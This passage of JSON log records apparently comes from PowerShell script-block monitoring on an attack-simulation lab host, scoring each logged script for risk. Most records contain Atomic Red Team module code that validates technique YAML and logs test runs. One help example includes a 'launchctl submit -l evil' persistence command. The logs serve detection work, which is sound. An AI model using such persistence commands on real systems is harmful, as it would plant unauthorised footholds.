$AtomicTest['input_arguments'][$InputArgName]['type']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.\"\n                        return\n                    }\n\n                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']\n\n                    $InputArguments[$InputArgName] = $InputArgument\n\n                    $j++\n                }\n            }\n\n            $AtomicTestInstance.input_arguments = $InputArguments\n\n            if (-not $AtomicTest.ContainsKey('executor')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor'] -is [Hashtable])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.\"\n                return\n            }\n\n            if (-not $AtomicTest['executor'].ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor']['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.\"\n                return\n            }\n\n            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -eq 'manual') {\n                if (-not $AtomicTest['executor'].ContainsKey('steps')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['steps'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorManual]::new()\n                $ExecutorInstance.steps = $AtomicTest['executor']['steps']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])\n            }\n            else {\n                if (-not $AtomicTest['executor'].ContainsKey('command')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['command'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorDefault]::new()\n                $ExecutorInstance.command = $AtomicTest['executor']['command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])\n            }\n\n            # cleanup_command element is optional\n            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {\n                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])\n            }\n\n            # elevation_required element is optional\n            if ($AtomicTest['executor'].ContainsKey(",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1896401+00:00",
      "event_id": 35710678,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 18573,
      "full_command": "filter Get-AtomicTechnique {\n    <#\n    .SYNOPSIS\n\n    Retrieve and validate an atomic technique.\n\n    .DESCRIPTION\n\n    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.\n\n    This function facilitates the following use cases:\n\n    1) Validation prior to execution of atomic tests.\n    2) Writing code to reason over one or more atomic techniques/tests.\n    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.\n    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.\n\n    .PARAMETER Path\n\n    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.\n\n    .PARAMETER Yaml\n\n    Specifies a single string consisting of raw atomic technique YAML.\n\n    .EXAMPLE\n\n    Get-ChildItem -Path C:\\atomic-red-team\\atomics\\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-Item C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-AtomicTechnique -Path C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml\n\n    .EXAMPLE\n\n    $Yaml = @'\n    ---\n    attack_technique: T1152\n    display_name: Launchctl\n\n    atomic_tests:\n    - name: Launchctl\n      description: |\n        Utilize launchctl\n\n      supported_platforms:\n        - macos\n\n      executor:\n        name: sh\n        command: |\n          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n    '@\n\n    Get-AtomicTechnique -Yaml $Yaml\n\n    .INPUTS\n\n    System.IO.FileInfo\n\n    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.\n\n    .OUTPUTS\n\n    AtomicTechnique\n\n    Outputs an object representing a parsed and validated atomic technique.\n    #>\n\n    [CmdletBinding(DefaultParameterSetName = 'FilePath')]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]\n        [String]\n        [Alias('FullName')]\n        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]\n        $Path,\n\n        [Parameter(Mandatory, ParameterSetName = 'Yaml')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Yaml\n    )\n\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'FilePath' {\n            $ResolvedPath = Resolve-Path -Path $Path\n\n            $YamlContent = Get-Content -Path $ResolvedPath -Raw\n            $ErrorStringPrefix = \"[$($ResolvedPath)]\"\n        }\n\n        'Yaml' {\n            $YamlContent = $Yaml\n            $ErrorStringPrefix = ''\n        }\n    }\n\n    $ParsedYaml = $null\n\n    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')\n    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')\n\n    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.\n    # Capture the exception and convert to PowerShell error so that the user can decide\n    # how to handle the error.\n    try {\n        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent\n    }\n    catch {\n        Write-Error $_\n    }\n\n    if ($ParsedYaml) {\n        # The document was well-formed YAML. Now, validate against the atomic red schema\n\n        $AtomicInstance = [AtomicTechnique]::new()\n\n        if (-not $ParsedYaml.Count) {\n            Write-Error \"$ErrorStringPrefix YAML file has no elements.\"\n            return\n        }\n\n        if (-not $ParsedYaml.ContainsKey('attack_technique')) {\n            Write-Error \"$ErrorStringPrefix 'attack_technique' element is required.\"\n            return\n        }\n\n        $AttackTechnique = $null\n\n        if ($ParsedYaml['attack_technique'].Count -gt 1) {\n            # An array of attack techniques are supported.\n            foreach ($Technique in $ParsedYaml['attack_technique']) {\n                if (\"$Technique\" -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n                    Write-Warning \"$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.\"\n                }\n\n                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']\n            }\n        }\n        else {\n            if ((-not \"$($ParsedYaml['attack_technique'])\".StartsWith('T'))) {\n                # If the attack technique is a single entry, validate that it starts with the letter T.\n                Write-Warning \"$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.\"\n            }\n\n            [String] $AttackTechnique = $ParsedYaml['attack_technique']\n        }\n\n        $AtomicInstance.attack_technique = $AttackTechnique\n\n        if (-not $ParsedYaml.ContainsKey('display_name')) {\n            Write-Error \"$ErrorStringPrefix 'display_name' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['display_name'] -is [String])) {\n            Write-Error \"$ErrorStringPrefix 'display_name' must be a string.\"\n            return\n        }\n\n        $AtomicInstance.display_name = $ParsedYaml['display_name']\n\n        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element must be an array.\"\n            return\n        }\n\n        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)\n\n        if (-not $ParsedYaml['atomic_tests'].Count) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.\"\n            return\n        }\n\n        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {\n            $AtomicTest = $ParsedYaml['atomic_tests'][$i]\n\n            $AtomicTestInstance = [AtomicTest]::new()\n\n            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n            if (-not $AtomicTest.ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.name = $AtomicTest['name']\n            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']\n\n            if (-not $AtomicTest.ContainsKey('description')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['description'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.description = $AtomicTest['description']\n\n            if (-not $AtomicTest.ContainsKey('supported_platforms')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.\"\n                return\n            }\n\n            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {\n                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {\n                    Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').\"\n                }\n            }\n\n            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']\n\n            $Dependencies = $null\n\n            if ($AtomicTest['dependencies'].Count) {\n                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)\n                $j = 0\n\n                # dependencies are optional and there can be multiple\n                foreach ($Dependency in $AtomicTest['dependencies']) {\n                    $DependencyInstance = [AtomicDependency]::new()\n\n                    if (-not $Dependency.ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.description = $Dependency['description']\n                    $StringsWithPotentialInputArgs.Add($Dependency['description'])\n\n                    if (-not $Dependency.ContainsKey('prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.prereq_command = $Dependency['prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])\n\n                    if (-not $Dependency.ContainsKey('get_prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['get_prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])\n\n                    $Dependencies[$j] = $DependencyInstance\n\n                    $j++\n                }\n\n                $AtomicTestInstance.dependencies = $Dependencies\n            }\n\n            if ($AtomicTest.ContainsKey('dependency_executor_name')) {\n                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').\"\n                    return\n                }\n\n                if ($null -eq $AtomicTestInstance.Dependencies) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.\"\n                }\n\n                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']\n            }\n\n            $InputArguments = $null\n\n            # input_arguments is optional\n            if ($AtomicTest.ContainsKey('input_arguments')) {\n                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {\n                    $AtomicTest['input_arguments'].GetType().FullName\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['input_arguments'].Count)) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.\"\n                    return\n                }\n\n                $InputArguments = @{}\n\n                $j = 0\n\n                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {\n\n                    $InputArgument = [AtomicInputArgument]::new()\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.\"\n                        return\n                    }\n\n                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.\"\n                        return\n                    }\n\n                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')\"\n                    }\n\n                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.\"\n                        return\n                    }\n\n                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']\n\n                    $InputArguments[$InputArgName] = $InputArgument\n\n                    $j++\n                }\n            }\n\n            $AtomicTestInstance.input_arguments = $InputArguments\n\n            if (-not $AtomicTest.ContainsKey('executor')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor'] -is [Hashtable])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.\"\n                return\n            }\n\n            if (-not $AtomicTest['executor'].ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor']['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.\"\n                return\n            }\n\n            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -eq 'manual') {\n                if (-not $AtomicTest['executor'].ContainsKey('steps')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['steps'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorManual]::new()\n                $ExecutorInstance.steps = $AtomicTest['executor']['steps']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])\n            }\n            else {\n                if (-not $AtomicTest['executor'].ContainsKey('command')) {\n             ",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1896571+00:00",
      "event_id": 35710679,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 4911,
      "full_command": "       Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['command'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorDefault]::new()\n                $ExecutorInstance.command = $AtomicTest['executor']['command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])\n            }\n\n            # cleanup_command element is optional\n            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {\n                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])\n            }\n\n            # elevation_required element is optional\n            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {\n                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.\"\n                    return\n                }\n\n                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']\n            }\n            else {\n                # if elevation_required is not present, default to false\n                $ExecutorInstance.elevation_required = $False\n            }\n\n            $InputArgumentNames = $null\n\n            # Get all input argument names\n            $InputArgumentNames = $InputArguments.Keys\n\n            # Extract all input arguments names from the executor\n            # Potential places where input arguments can be populated:\n            #  - Dependency description\n            #  - Dependency prereq_command\n            #  - Dependency get_prereq_command\n            #  - Executor steps\n            #  - Executor command\n            #  - Executor cleanup_command\n\n            $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n            ForEach-Object { $Regex.Matches($_) } |\n            Select-Object -ExpandProperty Groups |\n            Where-Object { $_.Name -eq 'ArgName' } |\n            Select-Object -ExpandProperty Value |\n            Sort-Object -Unique\n\n\n            # Validate that all executor input arg names are defined input arg names.\n            if ($InputArgumentNamesFromExecutor.Count) {\n                $InputArgumentNamesFromExecutor | ForEach-Object {\n                    if ($InputArgumentNames -notcontains $_) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'\"\n                        return\n                    }\n                }\n            }\n\n            # Validate that all defined input args are utilized at least once in the executor.\n            if ($InputArgumentNames.Count) {\n                $InputArgumentNames | ForEach-Object {\n                    if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                        # Write a warning since this scenario is not considered a breaking change\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.\"\n                    }\n                }\n            }\n\n            $ExecutorInstance.name = $AtomicTest['executor']['name']\n\n            $AtomicTestInstance.executor = $ExecutorInstance\n\n            $AtomicTests[$i] = $AtomicTestInstance\n        }\n\n        $AtomicInstance.atomic_tests = $AtomicTests\n\n        $AtomicInstance\n    }\n}\n\n\n# Tab completion for Atomic Tests\nfunction Get-TechniqueNumbers {\n    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }\n    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |\n    ForEach-Object { $_.BaseName }\n\n    return $techniqueNumbers\n}\n\nRegister-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {\n    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)\n\n    Get-TechniqueNumbers | Where-Object { $_ -like \"$wordToComplete*\" } |\n    ForEach-Object {\n        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', \"Technique number $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0149104+00:00",
      "event_id": 35710857,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1699,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    # send syslog message if a syslog server is defined in Public/config.ps1\n    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        $jsonMsg = $msg | ConvertTo-Json -Compress\n        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity \"Informational\" -Facility \"daemon\" -Transport $artConfig.syslogProtocol\n    }\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:46.5202721+00:00",
      "event_id": 35709123,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 64,
      "full_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir /text:vdir.name",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.6888245+00:00",
      "event_id": 35710826,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 650,
      "full_command": "function Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:53.9070401+00:00",
      "event_id": 35710482,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 186,
      "full_command": "\nImport-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force \n$PSDefaultParameterValues = @{\"Invoke-AtomicTest:PathToAtomicsFolder\"=\"C:\\AtomicRedTeam\\atomics\"}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:53.8870662+00:00",
      "event_id": 35710480,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 58,
      "full_command": ". 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:53.5484442+00:00",
      "event_id": 35709166,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 9,
      "full_command": "$global:?",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:59.0526552+00:00",
      "event_id": 35711133,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 9,
      "full_command": "$global:?",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2839316+00:00",
      "event_id": 35711115,
